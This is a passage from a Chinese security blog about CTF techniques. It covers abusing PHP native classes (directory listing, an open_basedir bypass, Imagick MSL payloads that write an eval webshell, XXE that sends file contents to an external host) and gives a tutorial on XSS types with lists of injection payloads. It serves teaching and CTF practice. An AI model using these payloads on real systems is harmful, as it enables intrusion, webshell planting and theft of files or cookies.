<h2 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h2><h3 id="文件是否存在-finfo"><a href="#文件是否存在-finfo" class="headerlink" title="文件是否存在(finfo)"></a>文件是否存在(<code>finfo</code>)</h3><p>利用版本: (PHP &gt;&#x3D; 5.3.0, PECL <code>fileinfo</code> &gt;&#x3D; 0.1.0) 判断文件是否存在(判断文件类型)</p>
<pre><code class="highlight php"><span class="variable">$f</span> = <span class="string">&quot;./aasd.php&quot;</span>; <span class="variable">$ff</span> = <span class="keyword">new</span> <span class="title function_ invoke__">finfo</span>(FILEINFO_MIME); <span class="keyword">echo</span> <span class="variable">$ff</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$f</span>);</code></pre>

<h3 id="目录遍历-Directory"><a href="#目录遍历-Directory" class="headerlink" title="目录遍历:Directory"></a>目录遍历:Directory</h3><p>这个类本意是不能够直接通过 new 方式进行创建利用，当使用 dir 函数时，这个类会被实例化。但我们依然可以直接实例化并使用其中的方法</p>
<p><strong>判断文件是否存在:</strong></p>
<pre><code class="highlight php"><span class="comment"># 判断某个目录是否存在，</span>
<span class="comment"># 如果存在返回目录字符串，若不存在则产生警告并返回NULL</span>
<span class="variable">$dir</span>=<span class="string">&quot;/etc&quot;</span>;
<span class="keyword">echo</span> (<span class="keyword">new</span> <span class="built_in">Directory</span>)-&gt;<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>));</code></pre>

<p><strong>读取目录:</strong></p>
<pre><code class="highlight php"><span class="variable">$dir</span> = <span class="string">&quot;/etc&quot;</span>;
<span class="variable">$d</span> = <span class="keyword">new</span> <span class="built_in">Directory</span>;
<span class="variable">$d</span>-&gt;resource = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>);
<span class="keyword">while</span>((<span class="variable">$c</span> = <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$d</span>-&gt;resource)))&#123;<span class="keyword">echo</span> <span class="variable">$c</span>.<span class="string">&quot;\n&quot;</span>;&#125;;</code></pre>



<h3 id="目录遍历-DirectoryIterator"><a href="#目录遍历-DirectoryIterator" class="headerlink" title="目录遍历:DirectoryIterator"></a>目录遍历:<code>DirectoryIterator</code></h3><p><code>DirectoryIterator</code> 会创建一个指定目录的迭代器。当执行到echo函数时，会触发<code>DirectoryIterator</code>类中的 <code>__toString()</code> 方法，输出指定目录里面经过排序之后的第一个文件名.</p>
<p>遍历文件目录,直接对文件全部输出出来.</p>
<pre><code class="highlight plaintext">&lt;?php $dir=new DirectoryIterator(&quot;/&quot;); foreach($dir as $f)&#123;    echo($f.&#x27;&lt;br&gt;&#x27;);    //echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;); &#125;</code></pre>

<p>利用<code> DirectoryIterator</code> 类对象 + glob:&#x2F;&#x2F; 协议获取目录结构，能够突破 <code>open_basedir</code> 的限制：</p>
<pre><code class="highlight plaintext">$dir=new DirectoryIterator(&quot;glob:///*&quot;); foreach($dir as $f)&#123;    echo($f.&#x27;&lt;br&gt;&#x27;);    //echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;); &#125;</code></pre>

<p>一些其他的用法：</p>
<pre><code class="highlight plaintext"># 简单列目录
$dir = &quot;./geek&quot;;
$d = new DirectoryIterator($dir);
while ($d-&gt;valid())&#123;
    echo $d.&quot;\n&quot;;
    $d-&gt;next();
&#125;

# 也可以用来获取文件的信息
$dir = &quot;./geek&quot;;
$d = new DirectoryIterator($dir);
while($d-&gt;valid())&#123;

    # 获取最后访问时间
    var_dump($d-&gt;getATime());
    # 获取创建时间
    var_dump($d-&gt;getCTime());
    # 获取最后修改时间
    var_dump($d-&gt;getMtime());
    # 获取文件名，
    # 直接用 __toString 也可以
    var_dump($d-&gt;getFilename());
    var_dump((string)$d);
    # 获取文件名 (自动除去后缀名)，
    # 比如除去 .php 后缀名
    var_dump($d-&gt;getBasename(&quot;php&quot;));
    # 获取目录和文件名
    var_dump($d-&gt;getPathname());
    # 获取文件所有者
    var_dump($d-&gt;getOwner());
    # 获取文件所有组
    var_dump($d-&gt;getGroup());
    # 获取文件inode编号
    var_dump($d-&gt;getInode());
    # 获取文件权限
    var_dump(substr(sprintf(&quot;%o&quot;,$d-&gt;getPerms()),-4));
    # 获取文件大小
    var_dump(($d-&gt;getSize()/1024).&quot; kb&quot;);
    # 获取文件类型 (file/dir)
    var_dump($d-&gt;getType());
    # 判断文件是否是目录
    var_dump($d-&gt;isDir());
    # 判断文件是否是文件 (不是目录)
    var_dump($d-&gt;isFile());
    # 判断文件是否为 ./..
    var_dump($d-&gt;isDot());
    # 判断文件是否可执行
    var_dump($d-&gt;isExecute());
    # 判断文件是否是链接文件
    var_dump($d-&gt;isLink());
    # 判断文件是否可读
    var_dump($d-&gt;isReadable());
    # 判断文件是否可写
    var_dump($d-&gt;isWriteable());

    $d-&gt;next();
&#125;

# 一些其他方法的功能
# 获取当前目录路径 (其实也就是 ? )
var_dump($d-&gt;path());
# 获取当前元素的索引
var_dump($d-&gt;key());
# 将当前索引移动到下一个元素
$d-&gt;next();
# 将索引重置到开头
$d-&gt;rewind();
# 设置索引
$d-&gt;seek(0);
# 判断当前索引的文件是否合法 (是否是一个文件)
$d-&gt;vaild();
</code></pre>

<h3 id="目录遍历-FilesystemIterator"><a href="#目录遍历-FilesystemIterator" class="headerlink" title="目录遍历:FilesystemIterator"></a>目录遍历:<code>FilesystemIterator</code></h3><p>利用版本：(PHP 5 &gt;&#x3D; 5.3.0, PHP 7)</p>
<p>其实这个类实际上也就是 <code>DirectoryIterator</code> 类的升级版，基本继承了<code> DirectorIterator</code> 类的所有方法，所以利用方式和 <code>DirectorIterator</code> 一样:</p>
<h3 id="目录遍历-GlobIterator"><a href="#目录遍历-GlobIterator" class="headerlink" title="目录遍历:GlobIterator"></a>目录遍历:<code>GlobIterator</code></h3><p>利用版本：(PHP 5 &gt;&#x3D; 5.3.0, PHP 7)<code>GlobIterator</code>无需配合 glob:&#x2F;&#x2F; 协议枚举目录。</p>
<pre><code class="highlight plaintext">foreach(new GlobIterator(&quot;./*&quot;) as $f)&#123;    echo $f.&quot;\n&quot;; &#125;</code></pre>

<p>在 CTF 中如果知道了 flag 的位置，但不知道 flag 的文件名，则可以使用:<code>GlobIterator(&quot;/*flag*&quot;)</code></p>
<h3 id="文件操作-ZipArchive"><a href="#文件操作-ZipArchive" class="headerlink" title="文件操作:ZipArchive"></a>文件操作:ZipArchive</h3><p>利用版本: (PHP 5 &gt;&#x3D; 5.2.0, PHP 7, PECL zip &gt;&#x3D; 1.1.0)</p>
<p>这个类是在php5.2.0之后引入的，我们之前会在一些原生类利用中见到它，我们可以用这个类来删除文件，读取文件以及有损写文件。</p>
<p><strong>删除文件</strong></p>
<pre><code class="highlight plaintext">$a=new ZipArchive();
$a-&gt;open(&quot;file&quot;, ZipArchive::OVERWRITE); // ZipArchive::CREATE也可以用8代替</code></pre>

<p><strong>读取文件</strong></p>
<pre><code class="highlight plaintext">$f = &quot;flag&quot;;
$zip=new ZipArchive();
$zip-&gt;open(&quot;a.zip&quot;, ZipArchive::CREATE);
$zip-&gt;addFile($f);
$zip-&gt;close();
$zip-&gt;open(&quot;a.zip&quot;);
echo $zip-&gt;getFromName($f);
$zip-&gt;close();</code></pre>

<p><strong>有损写文件</strong></p>
<pre><code class="highlight plaintext">$f = &quot;flag&quot;;
$zip=new ZipArchive();
$zip-&gt;open(&quot;a.zip&quot;, ZipArchive::CREATE);
$zip-&gt;setArchiveComment(&quot;&lt;?php phpinfo();?&gt;&quot;);
$zip-&gt;addFromString(&quot;file&quot;, &quot;&quot;);
$zip-&gt;close();
//include &quot;a.zip&quot;;</code></pre>

<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p><a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARM</a> 这篇文章的作者在应对如下场景时找到了一种新的利用手法——Imagick。</p>
<pre><code class="highlight plaintext">new $_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</code></pre>

<p>如果仅可控类名和一个参数名，且只能够实例化对象，不能执行对象方法的情况下，同样可以实现 RCE。</p>
<h3 id="空字节截断"><a href="#空字节截断" class="headerlink" title="空字节截断"></a>空字节截断</h3><p>Imagick 参数被空字节截断也可以正常使用</p>
<pre><code class="highlight plaintext"># No errors $a = new Imagick(&quot;/tmp/positive.png\x00.jpg&quot;); # No errors $a = new Imagick(&quot;http://attacker.com/test\x00test&quot;);</code></pre>

<h3 id="https"><a href="#https" class="headerlink" title="https:&#x2F;"></a>https:&#x2F;</h3><p>https:&#x2F; 会调用 curl</p>
<pre><code class="highlight plaintext">$a = new Imagick(&quot;https:/127.0.0.1:9999/positive.png\x00.jpg&quot;);</code></pre>

<h3 id="vid-tempfile-RCE"><a href="#vid-tempfile-RCE" class="headerlink" title="vid + tempfile RCE"></a>vid + tempfile RCE</h3><p>php 会将 post 接收到的文件以临时文件的形式保存在 &#x2F;tmp 下。假设我们上传一个 msl 文件如下</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;image&gt; &lt;read filename=&quot;caption:&lt;?php @eval(@$_REQUEST[&#x27;a&#x27;]); ?&gt;&quot; /&gt; &lt;!-- Relative paths such as info:./../../uploads/swarm.php can be used as well --&gt; &lt;write filename=&quot;info:/var/www/swarm.php&quot; /&gt; &lt;/image&gt;</code></pre>

<p>如果使用 vid:msl 的形式将该临时文件进行读取，解析 msl 时会将 webshell 的内容写入 &#x2F;var&#x2F;www&#x2F;swarm.php</p>
<pre><code class="highlight plaintext">$a = new Imagick(&quot;vid:msl:/tmp/php*&quot;);</code></pre>

<p>CISCN 2022 有根据这个知识点出过题：<a href="https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md">CTF-Challenges&#x2F;CISCN&#x2F;2022&#x2F;backdoor&#x2F;writup&#x2F;writup.md at master · AFKL-CUIT&#x2F;CTF-Challenges · GitHub</a>，但利用 payload 有所区别, 使用 inline 将文件内容以 base64 的形式编码在 msl 文件中。</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;image&gt; &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=&quot; /&gt; &lt;write filename=&quot;/tmp/sess_afkl&quot; /&gt; &lt;/image&gt;</code></pre>

<p>SCTF 2023 中对这种利用方式进行了探索，可以达到读取文件内容的效果。</p>
<pre><code class="highlight xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> <span class="tag">&lt;<span class="name">image</span>&gt;</span> <span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;mvg:/flag&quot;</span> /&gt;</span> <span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/tmp/xxxx&quot;</span> /&gt;</span> <span class="tag">&lt;/<span class="name">image</span>&gt;</span></code></pre>

<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h3><pre><code class="highlight plaintext"> class SimpleXMLElement implements Stringable, Countable, RecursiveIterator &#123;
    /* Methods */
    public __construct(
        string $data,
        int $options = 0,
        bool $dataIsURL = false,
        string $namespaceOrPrefix = &quot;&quot;,
        bool $isPrefix = false
    )
    public addAttribute(string $qualifiedName, string $value, ?string $namespace = null): void
    public addChild(string $qualifiedName, ?string $value = null, ?string $namespace = null): ?SimpleXMLElement
    public asXML(?string $filename = null): string|bool
    public attributes(?string $namespaceOrPrefix = null, bool $isPrefix = false): ?SimpleXMLElement
    public children(?string $namespaceOrPrefix = null, bool $isPrefix = false): ?SimpleXMLElement
    public count(): int
    public getDocNamespaces(bool $recursive = false, bool $fromRoot = true): array|false
    public getName(): string
    public getNamespaces(bool $recursive = false): array
    public registerXPathNamespace(string $prefix, string $namespace): bool
    public __toString(): string
    public xpath(string $expression): array|null|false
&#125;</code></pre>

<ul>
<li>data: xml 字符串，xml 文档路径或者 url 路径（如果 dataIsURL 为 true</li>
<li>dataIsURL: 默认情况下为 false，为 true 时 data 为一个 url 路径</li>
<li>option：设置为 LIBXML_NOENT 时，可能会导致 xxe 攻击，LIBXML_NOENT 为 2.</li>
</ul>
<p><strong>读取文件</strong></p>
<p>poc:</p>
<pre><code class="highlight plaintext">$x=new SimpleXMLElement(&quot;http://xxx.xxx.xxx.xxx/evil.xml&quot;,2,true);</code></pre>

<p>evil.xml</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;   &lt;!DOCTYPE ANY[   &lt;!ENTITY % remote SYSTEM &quot;http://xxx.xxx.xxx.xxx/send.xml&quot;&gt;   %remote;   %all;   %send;   ]&gt;</code></pre>

<p>send.xml</p>
<pre><code class="highlight plaintext">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;   &lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#x27;http://xxx.xxx.xxx.xxx/send.php?file=%file;&#x27;&gt;&quot;&gt;</code></pre>

<h3 id="SimpleXMLIterator"><a href="#SimpleXMLIterator" class="headerlink" title="SimpleXMLIterator"></a><code>SimpleXMLIterator</code></h3><p>可用于代替 <code>SimpleXMLElement</code></p>
]]></content>
      <tags>
        <tag>-Web</tag>
      </tags>
  </entry>
  <entry>
    <title>详解XSS注入</title>
    <url>/2025/03/15/%E8%AF%A6%E8%A7%A3XSS%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="XSS注入"><a href="#XSS注入" class="headerlink" title="XSS注入"></a>XSS注入</h1><pre><code class="highlight plaintext">&quot;球球你了！就让我插一句话，我什么都会做的!!!&quot;

&quot;byd被我注入了吧&quot;</code></pre>

<h2 id="认识XSS攻击"><a href="#认识XSS攻击" class="headerlink" title="认识XSS攻击"></a>认识XSS攻击</h2><p>XSS全称是Cross Site Scripting即跨站脚本，当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就发生了。</p>
<ul>
<li><p>XSS 的运行原理是将恶意的 script 脚本插入进 html&#x2F;css&#x2F;js 文件当中。（通过在html标准的语句后触发事件，而事件则是执行恶意js</p>
<p>代码）</p>
</li>
</ul>
<p>作为一种HTML注入攻击，XSS攻击的核心思想就是在HTML页面中注入恶意代码，而XSS采用的注入方式是非常巧妙的。在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。</p>
<p>由于有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访 问目标服务器上被注入恶意脚本的页面后，由于它对目标服务器的信任，这段恶意脚本的执行不会受到什么阻碍。而此时，攻击者的目的就已经达到了。</p>
<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><pre><code class="highlight plaintext">又称**非持久型XSS**。之所以称为反射型XSS，是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的：发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，故叫反射型XSS。 而称为非持久型XSS，则是因为这种攻击方式具有一次性，由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用。

攻击者通过电子邮件等方式给别人发送带有恶意脚本代码参数的 URL，当 URL 地址被打开时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，特有的恶意代码参数被 HTML 解析、执行。

非持久型 XSS 漏洞攻击的**四大特点**：① 即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据；②攻击者需要诱骗点击；③反馈率低，所以较难发现和响应修复；④盗取用户敏感保密信息。

防止出现非持久型 XSS 漏洞的**五大措施**：① Web 页面渲染的所有内容或者渲染的数据都必须来自于服务端；②尽量不要从 URL，document.referrer，document.forms 等这种 DOM API 中获取数据直接渲染；③尽量不要使用 eval, new Function()，document.write()，document.writeln()，window.setInterval()，window.setTimeout()，innerHTML，document.creteElement() 等可执行字符串的方法；④如果做不到以上几点，也必须对涉及 DOM 渲染的方法传入的字符串参数做 escape 转义；⑤ 前端渲染的时候对任何的字段都需要做 escape 转义编码</code></pre>

<p>反射型 XSS 的 Payload 如下</p>
<pre><code class="highlight plaintext">&lt;script&gt;alert(1)&lt;script&gt;</code></pre>

<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ul>
<li>“&gt;闭合绕过</li>
</ul>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><pre><code class="highlight plaintext">存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。

一般存在于 Form 表单提交等交互功能，如发帖留言，提交文本信息等，黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。

这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。

可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入一个页面当中，所有访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型的XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入的往往是一些我们所信任的页面，因此无论我们多么小心，都难免会受到攻击。可以说，存储型XSS更具有隐蔽性，带来的危害也更大，除非服务器能完全阻止注入，否则任何人都很有可能受到攻击。

持久型 XSS 的三**大特点**：①持久性，植入在数据库中；②危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡；③ 盗取用户敏感私密信息。

防止持久型 XSS 漏洞的**三大措施：** ①后端在入库前应该选择不相信任何前端数据，将所有的字段统一进行转义处理；②后端在输出给前端数据统一进行转义处理；③前端在渲染页面 DOM 的时候应该选择不相信任何后端数据，任何字段都需要做转义处理。</code></pre>



<h2 id="DOM-based-型"><a href="#DOM-based-型" class="headerlink" title="DOM-based 型"></a>DOM-based 型</h2><pre><code class="highlight plaintext">客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 [DOM-based XSS](https://zhida.zhihu.com/search?content_id=164263694&amp;content_type=Article&amp;match_order=1&amp;q=DOM-based+XSS&amp;zhida_source=entity) 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。</code></pre>



<h2 id="基于字符集的-XSS"><a href="#基于字符集的-XSS" class="headerlink" title="基于字符集的 XSS"></a>基于字符集的 XSS</h2><pre><code class="highlight plaintext">哪怕现在很多的浏览器以及各种开源的库都专门针对了 XSS 进行转义处理，尽量默认抵御绝大多数 XSS 攻击，但是还是有很多方式可以绕过转义规则，让人防不胜防。比如「基于字符集的 XSS 攻击」就是绕过这些转义处理的一种攻击方式，比如有些 Web 页面字符集不固定，用户输入非期望字符集的字符，有时会绕过转义过滤规则。

可以形成「基于字符集的 XSS 攻击」的原因是由于浏览器在 meta 没有指定 charset 的时候有自动识别编码的机制，所以这类攻击通常就是发生在没有指定或者没来得及指定 meta 标签的 charset 的情况下。

避免基于字符集的 XSS 攻击的**两大方法：**①记住指定 &lt;meta charset=&quot;utf-8&quot;&gt;；② XML 中不仅要指定字符集为 utf-8，而且标签要闭合。</code></pre>



<h2 id="基于-Flash-的跨站-XSS"><a href="#基于-Flash-的跨站-XSS" class="headerlink" title="基于 Flash 的跨站 XSS"></a>基于 Flash 的跨站 XSS</h2><pre><code class="highlight plaintext">基于 Flash 的跨站 XSS 也是属于反射型 XSS 的一种，AS 脚本可以接受用户输入并操作 cookie，攻击者可以配合其他 XSS（持久型或者非持久型）方法将恶意 swf 文件嵌入页面中。主要是因为 AS 有时候需要和 JS 传参交互，攻击者会通过恶意的 XSS 注入篡改参数，窃取并操作cookie。

基于 Flash 的跨站 XSS 的**两种避免方法** **：**①严格管理 cookie 的读写权限；②对 Flash 能接受用户输入的参数进行过滤 escape 转义处理。</code></pre>



<h2 id="未经验证的跳转-XSS"><a href="#未经验证的跳转-XSS" class="headerlink" title="未经验证的跳转 XSS"></a>未经验证的跳转 XSS</h2><pre><code class="highlight plaintext">有一些场景是后端需要对一个传进来的待跳转的 URL 参数进行一个 302 跳转，可能其中会带有一些用户的敏感（cookie）信息。如果服务器端做302 跳转，跳转的地址来自用户的输入，攻击者可以输入一个恶意的跳转地址来执行脚本。

防止未经验证的跳转 XSS漏洞的**两种措施：**①对待跳转的 URL 参数做白名单或者某种规则过滤；②后端注意对敏感信息的保护, 比如 cookie 使用来源验证。</code></pre>

<h2 id="XSS-BOT"><a href="#XSS-BOT" class="headerlink" title="XSS BOT"></a>XSS BOT</h2><h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2><h2 id="常用标签语句"><a href="#常用标签语句" class="headerlink" title="常用标签语句"></a>常用标签语句</h2><h3 id><a href="#" class="headerlink" title="&lt;script&gt;"></a><code>&lt;script&gt;</code></h3><p>哈哈，经典款，鉴定为第一个过滤的</p>
<p>元素内部构造:</p>
<pre><code class="highlight css">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;
&lt;script&gt;alert(/xss/)&lt;/script&gt;
&lt;script&gt;alert(<span class="number">123</span>)&lt;/script&gt;</code></pre>

<h3 id="-1"><a href="#-1" class="headerlink" title="&lt;a&gt;"></a><code>&lt;a&gt;</code></h3><p>也是经典款(指html里面)</p>
<p>元素内部构造:</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">a</span> href=&quot;javascript:<span class="built_in">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt;test&lt;/a&gt;</span>
<span class="string">&lt;a href=&quot;</span>x<span class="string">&quot; onfocus=&quot;</span><span class="built_in">alert</span>(<span class="string">&#x27;xss&#x27;</span>);&quot; autofocus=&quot;&quot;&gt;xss&lt;/<span class="selector-tag">a</span>&gt;
&lt;<span class="selector-tag">a</span> href=&quot;<span class="attribute">x</span>&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/<span class="selector-tag">a</span>&gt;
&lt;<span class="selector-tag">a</span> href=&quot;<span class="attribute">x</span>&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">a</span>&gt;
&lt;<span class="selector-tag">a</span> href=&quot;<span class="attribute">x</span>&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">a</span>&gt;
<span class="comment">/*呃呃，感觉要多记这些属性，反正前端设计也要用到*/</span></code></pre>

<h3 id="-2"><a href="#-2" class="headerlink" title="&lt;img&gt;"></a>&lt;<code>img&gt;</code></h3><p>作为一个图片触发，成功触发会显示一个破损的图片</p>
<p>元素内部构造:</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="attribute">x</span> onerror=&quot;alert(<span class="number">1</span>)&quot;&gt;
&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="attribute">x</span> onerror=eval(&quot;alert(<span class="number">1</span>)&quot;)&gt;
&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="number">1</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="number">1</span> onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="number">1</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</code></pre>

<h3 id="-3"><a href="#-3" class="headerlink" title="&lt;iframe&gt;"></a><code>&lt;iframe&gt;</code></h3><p>内嵌框架元素</p>
<p>元素内部构造:</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">iframe</span> <span class="attribute">src</span>=&quot;javascript:<span class="built_in">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt;test&lt;/iframe&gt;</span>
<span class="string">&lt;iframe onload=&quot;</span><span class="built_in">alert</span>(document.cookie)<span class="string">&quot;&gt;&lt;/iframe&gt;</span>
<span class="string">&lt;iframe onload=&quot;</span><span class="built_in">alert</span>(<span class="string">&#x27;xss&#x27;</span>);&quot;&gt;&lt;/<span class="selector-tag">iframe</span>&gt;
&lt;<span class="selector-tag">iframe</span> onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/<span class="selector-tag">iframe</span>&gt;
&lt;<span class="selector-tag">iframe</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">iframe</span>&gt;
&lt;<span class="selector-tag">iframe</span> <span class="attribute">src</span>=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre>

<h3 id="-4"><a href="#-4" class="headerlink" title="&lt;audio&gt;"></a><code>&lt;audio&gt;</code></h3><p>音频元素</p>
<p>元素内部构造:</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">audio</span> <span class="attribute">src</span>=<span class="number">1</span> onerror=alert(<span class="number">1</span>)&gt;
&lt;<span class="selector-tag">audio</span>&gt;&lt;<span class="selector-tag">source</span> <span class="attribute">src</span>=&quot;<span class="attribute">x</span>&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">audio</span>&gt;
&lt;<span class="selector-tag">audio</span> controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/<span class="selector-tag">audio</span>&gt;
&lt;<span class="selector-tag">audio</span> controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">source</span> <span class="attribute">src</span>=&quot;<span class="attribute">x</span>&quot;&gt;&lt;/<span class="selector-tag">audio</span>&gt;</code></pre>

<h3 id="video"><a href="#video" class="headerlink" title="video"></a><code>video</code></h3><p>视频元素</p>
<p>元素内部构造:</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">video</span> <span class="attribute">src</span>=<span class="attribute">x</span> onerror=alert(<span class="number">1</span>)&gt;
&lt;<span class="selector-tag">video</span>&gt;&lt;<span class="selector-tag">source</span> onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;
&lt;<span class="selector-tag">video</span> controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;
&lt;<span class="selector-tag">video</span> controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;
&lt;<span class="selector-tag">video</span> controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;</code></pre>

<h3 id="svg"><a href="#svg" class="headerlink" title="svg"></a><code>svg</code></h3><p>矢量图片元素</p>
<p>元素内部构造:</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">svg</span> onload=javascript:<span class="built_in">alert</span>(<span class="number">1</span>)&gt;
&lt;svg onload=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/svg&gt;</code></pre>

<h3 id="-5"><a href="#-5" class="headerlink" title="&lt;button&gt;"></a><code>&lt;button&gt;</code></h3><p>元素上点击鼠标时触发（<del>因为人叫button</del></p>
<p>元素内部构造:</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">button</span> onclick=alert(<span class="number">1</span>)&gt;
&lt;<span class="selector-tag">button</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
&lt;<span class="selector-tag">button</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
&lt;<span class="selector-tag">button</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
